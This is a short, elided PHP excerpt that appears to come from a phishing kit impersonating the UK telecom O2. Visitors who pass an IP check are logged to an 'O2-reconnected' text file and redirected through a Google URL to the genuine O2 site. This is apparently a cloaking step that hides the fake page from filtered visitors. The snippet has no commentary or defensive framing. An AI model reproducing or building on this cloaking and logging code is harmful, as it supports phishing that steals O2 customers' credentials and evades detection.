...
$reconnectedattemptip = $_SERVER['REMOTE_ADDR'];
...
$result = $checklist->ipPass( $ip );
	if ( $result ) {
		...
		$click .= "$reconnectedattemptip\n";
		$clickfile=fopen("loging/logs/O2-reconnected.txt","a");
		fwrite($clickfile,$click);
		fclose($clickfile);		
header("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwjG7vbslKfbAhUCK1AKHSPqByYQFggoMAA&url=https%3A%2F%2Fwww.o2.co.uk%2F&usg=AOvVaw0zRxuQ-r4l8oXR9-Ztb6-c");
die();
	}	
}
?>